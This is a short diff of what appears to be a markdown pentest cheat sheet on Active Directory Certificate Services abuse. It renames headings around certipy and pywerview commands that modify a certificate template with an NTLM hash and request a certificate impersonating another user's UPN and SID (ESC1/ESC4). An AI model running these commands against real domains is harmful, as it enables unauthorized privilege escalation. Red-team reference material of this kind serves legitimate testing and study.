@@ -1942,7 +1942,8 @@ certipy find -u <USER> -p <PASSWORD> -stdout
 
 ### Configure ESC1
 - Possible to use https://github.com/fortalice/modifyCertTemplate for more controls
-#### Save template
+
+#### Abuse and save template
 ```
 certipy template -u <USER>@<FQDN> -hashes <NTLM HASH> -template <TEMPLATE NAME> -save-old
 ```
@@ -1952,7 +1953,7 @@ certipy template -u <USER>@<FQDN> -hashes <NTLM HASH> -template <TEMPLATE NAME> 
 pywerview get-netuser -u <USER> -p <PASSWORD --username <USER> --domain <FQDN DOMAIN> --dc-ip <DC IP> --attributes "objectsid"
 ```
 
-#### Abuse ESC4
+#### Request cert
 ```
 certipy req -u <USER> -hashes <NTLM HASH> -ca <CA NAME> -target <FQDN CA> -template <TEMPLATE NAME> -upn <USER>@<FQDN DOMAIN> -extensionsid <USER SID> -out 'esc4-certipy' -debug
 ```
